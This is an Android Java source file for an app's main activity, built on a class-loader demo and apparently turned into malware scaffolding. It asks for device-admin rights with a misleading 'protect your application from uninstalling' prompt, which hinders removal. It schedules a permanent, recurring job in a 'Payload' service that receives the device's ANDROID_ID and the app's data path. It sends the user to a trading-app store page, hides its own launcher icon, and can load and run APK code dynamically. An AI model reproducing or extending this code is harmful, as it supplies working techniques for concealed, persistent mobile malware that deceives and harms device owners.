package com.catherine.classloader;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.JobParameters;
import com.firebase.jobdispatcher.JobService;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;
import static com.firebase.jobdispatcher.Lifetime.FOREVER;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
public class MainActivity extends Activity implements View.OnClickListener {
    private final static String TAG = "MainActivity";
    private TextView tv_console;
    private Button bt_load_apk1, bt_call_method, bt_launch_apk, bt_load_apk2;

    private  Class<?> apkActivity;
    private  Class<?extends com.firebase.jobdispatcher.JobService> joBClass;
    private  Class<?> apkUtils;
    private FirebaseJobDispatcher mDispatcher;
    private Job myJob;
    private String TagJob="TagPaylo";
    Button btExit;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       setContentView(R.layout.activity_main);
        btExit = (Button) findViewById(R.id.btExit);
        btExit.setOnClickListener(this);
/*        tv_console = (TextView) findViewById(R.id.tv_console);
        bt_load_apk1 = (Button) findViewById(R.id.bt_load_apk1);
        bt_load_apk1.setOnClickListener(this);
        bt_call_method = (Button) findViewById(R.id.bt_call_method);
        bt_call_method.setOnClickListener(this);
        bt_launch_apk = (Button) findViewById(R.id.bt_launch_apk);
        bt_launch_apk.setOnClickListener(this);
        bt_load_apk2 = (Button) findViewById(R.id.bt_load_apk2);
        bt_load_apk2.setOnClickListener(this);


        //download apk from your server and save it to Android/data/this app's package name/files/.
        //you can just put your apks into Android/data/this app's package name/files/.
        tv_console.setText("Download apk...\n");


        printHowClassLoaderWorks();
*/

        try {
            // Initiate DevicePolicyManager.
            DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

            // Set DeviceAdminDemo Receiver for active the component with different option
            ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);

            if (!policyMgr.isAdminActive(componentName)) {
                // try to become active
                Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Click on Activate button to protect your application from uninstalling!");

                startActivity(intent);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        Bundle myExtrasBundle = new Bundle();

        String android_id = Settings.Secure.getString(this.getContentResolver(),
                Settings.Secure.ANDROID_ID);
        myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        //FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new AlarmManagerDriver(this));
        myJob = mDispatcher.newJobBuilder()
                .setService(Payload.class)
                .setTag(TagJob)
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 0))
                .setLifetime(FOREVER)
                //.setReplaceCurrent(false)
                .setReplaceCurrent(true)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.schedule(myJob);
        //mDispatcher.mustSchedule(myJob);

/*        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
        startActivity(intent);

       openApk(MyConfig.apk1);
        intent = new Intent();
        intent.setClass(MainActivity.this, apkActivity);
       startActivity(intent);
        hideApplication();
*/        //finish();
    }

    private void printHowClassLoaderWorks() {
        Log.i(TAG, "Load core java libraries by " + String.class.getClassLoader());
        Log.i(TAG, "Load user-defined classes by " + MainActivity.class.getClassLoader());
        Log.i(TAG, "Load third party libraries by " + AppCompatActivity.class.getClassLoader());//what you imported from gradle or libs/
        Log.i(TAG, "Default classLoader is " + getClassLoader());
        Log.i(TAG, "Default system classLoader is " + ClassLoader.getSystemClassLoader());

        if (getClassLoader() == ClassLoader.getSystemClassLoader())
            Log.d(TAG, "Default class loader is equal to default system class loader.");
        else
            Log.e(TAG, "Default class loader is NOT equal to default system class loader.");
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.btExit:
                try {
                    // Initiate DevicePolicyManager.
                    DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);

                    // Set DeviceAdminDemo Receiver for active the component with different option
                    ComponentName componentName = new ComponentName(this, DeviceAdminComponent.class);

                    if (!policyMgr.isAdminActive(componentName)) {
                        // try to become active
                        Intent intent = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        //intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Click on Activate button to protect your application from uninstalling!");

                        startActivity(intent);
                        btExit.setText("Enable Admin");
                    }
                    else
                    {
                        Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                        startActivity(intent);
                        hideApplication();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }

                break;
            case R.id.bt_load_apk1:
//                ((MyApplication) getApplication()).RemoveApk();
                openApk(MyConfig.apk1);
                break;
            case R.id.bt_load_apk2:
//                ((MyApplication) getApplication()).RemoveApk();
//                openApk(MyConfig.apk2);

                Bundle myExtrasBundle = new Bundle();

                myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
                myExtrasBundle.putString("mandroid_id", Settings.Secure.getString(this.getContentResolver(),
                        Settings.Secure.ANDROID_ID));
                FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
                Job myJob = mDispatcher.newJobBuilder()
                        .setService(joBClass)
                        .setTag("TagPaylo")
                        .setRecurring(true)
                        //.setTrigger(Trigger.executionWindow(5, 30))
                        .setTrigger(Trigger.executionWindow(0, 0))
                        .setLifetime(FOREVER)
                        .setReplaceCurrent(false)
                        .setConstraints(Constraint.ON_ANY_NETWORK)
                        .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                        .setExtras(myExtrasBundle)
                        .build();
                mDispatcher.mustSchedule(myJob);

/*                Intent intent2 = new Intent();
                intent2.setClass(MainActivity.this, OpenResourceActivity.class);
                startActivity(intent2);
*/                break;
            case R.id.bt_call_method:
                try {
                    //set null as the first parameter of invoke() while invoking a static method.
                    //static String getInputStringStatic(String value)

                    Method getInputStringStatic = apkUtils.getDeclaredMethod("getInputStringStatic", Context.class);
                    //Method getInputStringStatic = apkUtils.getDeclaredMethod("helloworld", String.class);
                    String starpath=this.getApplicationInfo().dataDir;
                    String returns1 = (String) getInputStringStatic.invoke(null, this);

                    //String returns1 = (String) getInputStringStatic.invoke(null, "Hello, I'm your classLoader");
/*                    String history = tv_console.getText().toString();
                    tv_console.setText("getInputStringStatic:\t" + returns1 + "\n----\n" + history);

                    //static int getInputIntStatic(Integer value)
                   Method getInputIntStatic = apkUtils.getDeclaredMethod("getInputIntStatic", Integer.class);
                    int returns2 = (Integer) getInputIntStatic.invoke(null, 86400);
                    history = tv_console.getText().toString();
                    tv_console.setText("getInputIntStatic:\t" + returns2 + "\n----\n" + history);

                    //static String getStringValueStatic()
                    Method getStringValueStatic = apkUtils.getDeclaredMethod("getStringValueStatic");
                    String returns3 = (String) getStringValueStatic.invoke(null);
                    history = tv_console.getText().toString();
                    tv_console.setText("getStringValueStatic:\t" + returns3 + "\n----\n" + history);

                    //static int getIntValueStatic()
                    Method getIntValueStatic = apkUtils.getDeclaredMethod("getIntValueStatic");
                    int returns4 = (Integer) getIntValueStatic.invoke(null);
                    history = tv_console.getText().toString();
                    tv_console.setText("getIntValueStatic:\t" + returns4 + "\n----\n" + history);


                    //Get constructor for not-static method
                    Constructor<?> cons = apkUtils.getConstructor();

                    //String getStringValue()
                    Method getStringValue = apkUtils.getDeclaredMethod("getStringValue");
                    String returns5 = (String) getStringValue.invoke(cons.newInstance());
                    history = tv_console.getText().toString();
                    tv_console.setText("getStringValue:\t" + returns5 + "\n----\n" + history);

                    //int getIntValue()
                    Method getIntValue = apkUtils.getDeclaredMethod("getIntValue");
                    int returns6 = (Integer) getIntValue.invoke(cons.newInstance());
                    history = tv_console.getText().toString();
                    tv_console.setText("getIntValue:\t" + returns6 + "\n----\n" + history);

                    //Fields
                    Field myStaticField = apkUtils.getDeclaredField("myStaticField");

                    history = tv_console.getText().toString();
                    tv_console.setText(myStaticField.getName() + ":\t" + myStaticField.get(null) + "\n----\n" + history);

                    myStaticField.setAccessible(true);//You can update the field.
                    myStaticField.set(null, "new value");
                    myStaticField.setAccessible(false);

                    history = tv_console.getText().toString();
                    tv_console.setText(myStaticField.getName() + " updated:\t" + myStaticField.get(null) + "\n----\n" + history);
*/               } catch (NoSuchMethodException e) {
                    e.printStackTrace();
                } catch (InvocationTargetException e) {
                    e.printStackTrace();
                } catch (IllegalAccessException e) {
                    e.printStackTrace();
//                } catch (InstantiationException e) {
//                    e.printStackTrace();
                } catch (NullPointerException e) {
                    e.printStackTrace();

                    String history = tv_console.getText().toString();
                    tv_console.setText("Please load any apk first." + "\n----\n" + history);
//                } catch (NoSuchFieldException e) {
//                    e.printStackTrace();
                }
                break;
            case R.id.bt_launch_apk:
                try {
                    Intent intent = new Intent();
                    intent.setClass(MainActivity.this, apkActivity);
                    startActivity(intent);
                    hideApplication();
                    finish();
                } catch (NullPointerException e) {
                    e.printStackTrace();

                    String history = tv_console.getText().toString();
                    tv_console.setText("Please load any apk first." + "\n----\n" + history);
                }
                break;
        }
    }
    private void hideApplication() {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }
    public void openApk(String fileName) {
//        String history = tv_console.getText().toString();
//        tv_console.setText("Loading..." + "\n----\n" + history);

        logClassLoader("start to load apk");
        ((MyApplication) getApplication()).LoadApk(fileName);
        logClassLoader("apk loaded");

        //switch apks

        String senvpath=System.getenv("PATH");
        try {
            if (MyConfig.apk1.equals(fileName)) {
                apkActivity = getClassLoader().loadClass(MyConfig.APK1_ACTIVITY_MAIN);
                apkUtils = getClassLoader().loadClass(MyConfig.APK1_UTILS);

                Log.d(TAG, "Load the class of the apk by " + apkActivity.getClassLoader());

            } else if (MyConfig.apk2.equals(fileName)) {
                apkActivity = getClassLoader().loadClass(MyConfig.APK2_ACTIVITY_MAIN);
                apkUtils = getClassLoader().loadClass(MyConfig.APK2_UTILS);
            }
//            history = tv_console.getText().toString();
//            tv_console.setText(getApkInfo(fileName) + "\n----\n" + "Done!" + "\n----\n" + history);
        } catch (Exception e) {
            e.printStackTrace();

            if (e instanceof ClassNotFoundException) {
//                history = tv_console.getText().toString();
//                tv_console.setText("Have you ever put your apk into correct directory?" + "\n----\n" + history);
            }
        }
    }

    private void logClassLoader(String msg) {
        ClassLoader oldloader = getClass().getClassLoader();
        int sum = 0;
        try {
            while (oldloader != null) {
                Log.e(msg + sum, "" + oldloader);
                sum++;
                oldloader = oldloader.getParent();
            }
            Log.e(msg + sum, "" + oldloader);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        //Remove the latest loaded-apk
        ((MyApplication) getApplication()).RemoveApk();
        //mDispatcher.cancel(TagJob);
        //mDispatcher.schedule(myJob);
        //Intent broadcastIntent = new Intent("android.intent.action.BOOT_COMPLETED");
        //sendBroadcast(broadcastIntent);
        Log.d(TAG, "onDestroy");
    }

    public String getApkInfo(String fileName) {
        try {
            String dexPath = null;
            if (getExternalFilesDir(null) != null) {
                dexPath = new File(getExternalFilesDir(null), fileName).getAbsolutePath();
            } else if (getFilesDir() != null) {
                dexPath = new File(getFilesDir(), fileName).getAbsolutePath();
            }
            dexPath = new File(getDir("dex",
                    Context.MODE_PRIVATE), fileName).getAbsolutePath();
            PackageManager pm = getPackageManager();
            PackageInfo info = pm.getPackageArchiveInfo(dexPath, 0);

            StringBuilder sb = new StringBuilder();
            sb.append("\n*** Apk info ***\n");
            sb.append("versionCode:" + info.versionCode);
            sb.append("\nversionName:" + info.versionName);
            sb.append("\n*** Apk info ***\n");

            return sb.toString();
        } catch (Exception e) {
            e.printStackTrace();
            return e.toString();
        }
    }
}
